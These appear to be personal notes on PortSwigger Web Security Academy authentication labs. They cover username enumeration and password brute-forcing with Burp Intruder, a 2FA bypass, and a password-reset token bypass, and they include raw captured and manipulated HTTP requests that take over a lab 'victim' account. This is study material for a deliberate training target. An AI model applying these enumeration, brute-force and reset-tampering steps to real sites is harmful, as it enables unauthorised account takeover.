Portswigger Authentication: https://portswigger.net/web-security/authentication#what-is-authentication

# 1)Lab: Username enumeration via different responses
lab:https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

Lab Video(Rana khalil): https://www.youtube.com/watch?v=DEUCRYGt3TY&ab_channel=RanaKhalil


This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.


#### Solution

1. With Burp running, investigate the login page and submit an invalid username and password.
2. In Burp, go to **Proxy > HTTP history** and find the `POST /login` request. Highlight the value of the `username` parameter in the request and send it to Burp Intruder.
3. In Burp Intruder, notice that the `username` parameter is automatically set as a payload position. This position is indicated by two `§` symbols, for example: `username=§invalid-username§`. Leave the password as any static value for now.
4. Make sure that **Sniper attack** is selected.
5. In the **Payloads** side panel, make sure that the **Simple list** payload type is selected.
6. Under **Payload configuration**, paste the list of candidate usernames. Finally, click  **Start attack**. The attack will start in a new window.
7. When the attack is finished, examine the **Length** column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message `Invalid username`, but this response says `Incorrect password`. Make a note of the username in the **Payload** column.
8. Close the attack and go back to the **Intruder** tab. Click **Clear §**, then change the `username` parameter to the username you just identified. Add a payload position to the `password` parameter. The result should look something like this:
    
    `username=identified-user&password=§invalid-password§`
9. In the **Payloads** side panel, clear the list of usernames and replace it with the list of candidate passwords. Click  **Start attack**.
10. When the attack is finished, look at the **Status** column. Notice that each request received a response with a `200` status code except for one, which got a `302` response. This suggests that the login attempt was successful - make a note of the password in the **Payload** column.
11. Log in using the username and password that you identified and access the user account page to solve the lab.

```
Note: Solution i found was :- username=ec2-user&password=654321
```


# 2)Lab: 2FA simple bypass
Lab:https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
Lab Video: https://www.youtube.com/watch?v=2WpBVanEn3M&ab_channel=RanaKhalil


This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`



 ####  Solution

1. Log in to your own account. Your 2FA verification code will be sent to you by email. Click the **Email client** button to access your emails.
2. Go to your account page and make a note of the URL.

URL: https://0a87007e0461e262d0b33d9c00010016.web-security-academy.net/my-account?id=wiener
3. Log out of your account.
4. Log in using the victim's credentials.
5. When prompted for the verification code, manually change the URL to navigate to `/my-account`. The lab is solved when the page loads.



# 3) Lab: Password reset broken logic

Lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

Lab Video: https://www.youtube.com/watch?v=GtTk78pyLPI&ab_channel=RanaKhalil

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`



 ####  Solution

1. With Burp running, click the **Forgot your password?** link and enter your own username.
2. Click the **Email client** button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.
3. In Burp, go to **Proxy > HTTP history** and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the `POST /forgot-password?temp-forgot-password-token` request contains the username as hidden input. Send this request to Burp Repeater.
4. In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.
5. In the browser, request a new password reset and change your password again. Send the `POST /forgot-password?temp-forgot-password-token` request to Burp Repeater again.
6. In Burp Repeater, delete the value of the `temp-forgot-password-token` parameter in both the URL and request body. Change the `username` parameter to `carlos`. Set the new password to whatever you want and send the request.
7. In the browser, log in to Carlos's account using the new password you just set. Click **My account** to solve the lab.
Note:
```
This was the actual request:

POST /forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8 HTTP/2
Host: 0a3d00490439880f8048035900340023.web-security-academy.net
Cookie: session=lTHxOhZ3Bx8s6HXJnTqhPByn4OpVhvFz
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://0a3d00490439880f8048035900340023.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3d00490439880f8048035900340023.web-security-academy.net/forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8&username=wiener&new-password-1=peter&new-password-2=peter
```


**This was the manipulated request :** as told to do in step 6
```
POST /forgot-password?temp-forgot-password-token=x HTTP/2
Host: 0a3d00490439880f8048035900340023.web-security-academy.net
Cookie: session=lTHxOhZ3Bx8s6HXJnTqhPByn4OpVhvFz
Content-Length: 86
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Origin: https://0a3d00490439880f8048035900340023.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3d00490439880f8048035900340023.web-security-academy.net/forgot-password?temp-forgot-password-token=j6upkce94j1j0xo9yvtcj920maxxj1t8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

temp-forgot-password-token=x&username=carlos&new-password-1=peter&new-password-2=peter
```


# 4)Lab: Username enumeration via subtly different responses

Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses

Lab Video: https://www.youtube.com/watch?v=1pZTGqBgejU&ab_channel=RanaKhalil

